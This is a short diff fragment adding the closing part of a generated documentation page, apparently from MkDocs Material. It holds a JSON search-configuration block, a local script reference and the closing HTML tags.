+    <script id="__config" type="application/json">{"base": "../../..", "features": ["toc.integrate"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.6c7ad80a.min.js"></script>
+      
+    
+  </body>
+</html>
